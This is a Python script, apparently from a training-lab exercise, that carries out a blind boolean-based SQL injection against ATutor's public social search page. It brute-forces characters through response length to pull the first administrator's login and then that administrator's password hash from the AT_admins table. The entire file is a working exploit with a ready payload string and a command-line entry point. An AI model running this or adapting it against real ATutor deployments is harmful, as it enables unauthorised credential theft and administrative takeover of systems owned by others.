import requests
import sys

def search_friends_sqli(ip, inj_str):
    for j in range(32, 126):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q={}".format(ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)

        content_length = int(r.headers.get('Content-Length'))
        if content_length > 20:
            return j

    return None

def inject(r, inj, ip):
    extracted = ""

    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring(({}),{},1)))=[CHAR]/**/or/**/1='".format(inj, i)
        retrieved_value = search_friends_sqli(ip, injection_string)

        if retrieved_value:
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n(+) Done!")
            break

    return extracted

def main():
    if len(sys.argv) != 2:
        print("(+) usage: {}".format(sys.argv[0]))
        print("(+) e.g.: {} 192.168.119.137".format(sys.argv[0]))
        sys.exit(-1)


    ip = sys.argv[1]
    print("(+) Retrieving username....") 
    query = "SELECT/**/login/**/FROM/**/AT_admins/**/LIMIT/**/1"
    username = inject(50, query, ip)
    print("(+) Retrieving password hash....") 
    query = "SELECT/**/password/**/FROM/**/AT_admins/**/WHERE/**/login/**/=/**/\'{}\'".format(username)
    password = inject(50, query, ip)
    print("(+) Credentials: {} / {}".format(username, password)) 

if __name__ == "__main__": 
        main()
